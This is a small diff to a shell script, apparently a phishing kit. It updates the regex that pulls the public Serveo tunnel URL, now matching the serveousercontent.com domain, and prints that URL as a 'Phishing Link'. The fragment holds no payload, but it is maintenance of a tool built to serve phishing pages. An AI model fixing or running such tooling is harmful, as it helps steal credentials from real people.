@@ -197,7 +197,7 @@ start_serveo() {
     sleep 5
 
     if grep -q "Forwarding HTTP traffic" serveo.txt; then
-        PHISHING_URL=$(grep -oE "https?://[a-zA-Z0-9.-]+\.serveo.net" serveo.txt)
+        PHISHING_URL=$(grep -oE "https?://[a-zA-Z0-9.-]+\.serveousercontent.com" serveo.txt)
         echo -e "${GREEN}[+] Phishing Link: ${PHISHING_URL}${RESET}"
     else
         echo -e "${RED}[-] Serveo failed!${RESET}"
